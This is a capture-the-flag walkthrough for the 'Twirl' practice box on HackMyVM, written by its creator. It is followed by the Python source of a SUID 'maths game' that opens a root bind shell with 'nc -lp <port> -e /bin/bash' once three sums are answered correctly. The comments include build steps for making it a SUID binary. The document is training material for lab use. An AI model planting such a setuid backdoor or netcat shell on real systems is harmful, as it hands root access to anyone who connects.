**Dated:** 16 Jan 2021

**Solution** for the **Twirl** linux box -  I made for **HackMyVM** site ~ Made and tested in VMWare Workstation Pro
> 1. Avoid rabbit holes
> 1. Open web browser and go to .git file, at the bottom it says there is a website hosted called **superweb.com** and the word **TWIRL** is mentioned
> 1. Add this **superweb.com** to your linux OS (e.g. lets say you have Kali Linux as OS) */etc/hosts* file
> 1. On kali box, open superweb.com
> 1. On the right side of that picture, URL "photopea.com" is mentioned
> 1. Open the photopea.com website (or you can try in Photoshop or Gimp etc.) 
> 1. Load this image to the website. Select the area in which letters are twisted
> 1. Go to **Filter** -> **Distort** -> and select **TWIRL**
> 1. Drag the ANGLE BAR to left (approx value -230). Now you can read the distorted words easily
> 1. You have the creds of the username "skinnysec" and his password
> 1. Login as skinnysec user via SSH on port 30
> 1. inside /home/skinny folder there is a file called .bash_profile. On line 958 of there is a string. Decode this string with base64 two times. You now have the password of user el3phant; switch to user el3phant. 
> 1. Inside the /home dir of el3phant, there is a folder called **...**. Before going in, change its permission to chmod 777 ... (and then get into the folder ...) 
> 1. Go inside it and again there is another folder called ...
> 1. Read the **user.txt** flag
> 1. There is a folder called mysimplemathsgame. Play/run the game, answer 03 maths questions correctly and a BIND SHELL as root on some random TCP port will open. 
> 1. From Kali Box simply connect to that port with nc. eg. nc <ip> <port told by the game>
> 1. you are now root, read the root flag. 
  
## Sourcecode of binary mysimplemathsgame
  
```python
#Date: 14 Jan 2021
#Made + Tested on: Linux debian 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
#OS: Debian GNU/Linux 10

#How to make it a binary ?
#install pip, pyinstaller
#run pyinstall --onefile <this file>
#binary will be created
#assign ROOT group and set SUID bit set

#!/usr/bin/python3

import os,random,sys,time;

print("\n***Welcome to a new game designed by skinny3l3phant***\n");
print("\nJust answer 03 questions correctly, and I ll give you a reward\n");
print("\nRemember: You have to submit answers under 25 seconds\n");

loop=0;

while loop < 3:
    a = random.randint(31000,35000);
    b = random.randint(25010,55300);

    if loop == 0:
        answer = a+b;
        print("\n"+str(a) +" + "+ str(b)+" = ??? ");
        start=time.time();
        userInput = input("Your answer is: ");
        now=time.time();
        userInput=int(userInput);
        nettime=now-start;
        if (userInput == answer and (nettime < 25)):
            loop=loop+1;

        else:
            print("\nBye Bye.\n");
            sys.exit(1);

        
    elif loop == 1:
        answer = a*b;
        print("\n"+str(a) +" * "+ str(b)+" = ??? ");
        start=time.time();
        userInput = input("Your answer is: ");
        now=time.time();
        userInput=int(userInput);
        nettime=now-start;
        if (userInput == answer and (nettime < 25)):
 
            loop=loop+1;

        else:
            print("\nBye Bye\n");
            sys.exit(1);

    elif loop == 2:
        answer = a-b;
        print("\n"+str(a) +" - "+ str(b)+" = ??? ");
        start=time.time();
        userInput = input("Your answer is: ");
        now=time.time();
        userInput=int(userInput);
        nettime=now-start;
        if (userInput == answer and (nettime < 25)):
            loop=loop+1;

        else:
            print("\nBye Bye\n");
            sys.exit(1);


if loop == 3:
    print("***\nNice Maths Skills***");
    print("***As promised, I have a reward for you***");
    port = random.randint(1024,65000);
    port=str(port);
    print("I am going to open a TCP port --->"+port+" on my system, have fun with it but be gentle");
    
    try:
        os.setuid(0)
        #os.setgid(0)
        os.system("/usr/bin/nc -lp "+port+" -e /bin/bash &");
    
    except:
        print("\nSome weird error came, try again I guess :-(");
```
  
